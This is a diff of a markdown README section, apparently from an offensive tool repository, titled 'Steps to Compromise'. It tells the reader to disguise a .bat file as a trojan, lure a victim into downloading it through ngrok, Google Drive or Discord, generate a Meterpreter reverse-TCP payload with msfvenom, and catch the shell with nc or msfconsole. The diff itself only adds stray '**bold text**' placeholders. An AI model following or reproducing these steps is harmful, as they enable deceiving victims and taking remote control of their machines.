@@ -6,13 +6,13 @@
 
 ## Steps to Compromise:
 
-1. Make it convincing by turning it into a trojan horse.
-2. Get victim to download .bat file to their machine (i.e through ngrok server, google drive, discord, or other means.)
-3. Generate the payload: <br>
+1. Make it convincing by turning it into a trojan horse. **bold text** 
+2. Get victim to download .bat file to their machine (i.e through ngrok server, google drive, discord, or other means.) **bold text**
+3. Generate the payload: **bold text** <br>
 Using meterpreter here, but feel free to play around with it. <br>
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR_IP] LPORT=4444 -a x86 -f exe -o [FILE_NAME.exe]
 
-4. Setup your listener with nc or msfconsole: <br>
+4. Setup your listener with nc or msfconsole: **bold text** <br>
 nc -lvnp 9001 <br>
 or <br>
 msfconsole -q <br>
